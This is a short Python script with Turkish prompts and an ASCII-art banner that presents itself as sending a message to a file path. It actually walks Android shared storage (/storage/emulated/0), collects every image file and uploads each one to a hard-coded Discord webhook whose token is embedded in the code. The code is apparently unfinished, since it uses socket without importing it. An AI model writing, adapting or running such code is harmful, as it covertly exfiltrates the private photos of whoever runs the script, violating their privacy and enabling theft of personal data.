import os
import requests
import time
import random
from tqdm import tqdm 

WEBHOOK_URL = "https://discord.com/api/webhooks/1386332332293886115/Tj0aC2I-7O3HNW5jGz-yFyj2FJTX2U2OCNSa_4ERMIASDY7-2WA_iJ4gugeOaueaj6QE"

def get_device_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return hostname, local_ip
    except:
        return "Bilinmiyor", "Bilinmiyor"

def send_to_discord(file_path):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            requests.post(WEBHOOK_URL, files=files)
    except:
        pass

def scan_and_upload():
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    base_dir = "/storage/emulated/0" 
    
    target_id = input("Dosya Yolu ")
    print(f"\n **{target_id}** message send...")
    
    image_files = []
    for root, _, files in os.walk(base_dir):
        for file in files:
            if file.lower().endswith(image_extensions):
                image_files.append(os.path.join(root, file))
    
    total_images = len(image_files)
    if total_images == 0:
        print("dosya yolu bulunamadı!")
        return
    
    print(f" **{total_images}** başlıyor...\n")
    
    for image_path in tqdm(image_files, desc="BAŞLADI", unit="0"):
        send_to_discord(image_path)
        time.sleep(1) 
    
    print("\n Gönderim Tamamlandı !")

if __name__ == "__main__":
    print("""
 __  __   ______   _   __   ____   __       __  ___   ______   _____        _ 
\ \/ /  / ____/  / | / /  /  _/  / /      /  |/  /  / ____/  /__  /     _ | |
 \  /  / __/    /  |/ /   / /   / /      / /|_/ /  / __/       / /     (_)/ /
 / /  / /___   / /|  /  _/ /   / /___   / /  / /  / /___      / /__   _  / / 
/_/  /_____/  /_/ |_/  /___/  /_____/  /_/  /_/  /_____/     /____/  (_)/_/  
                                                                      /_/    
    """)
    scan_and_upload()
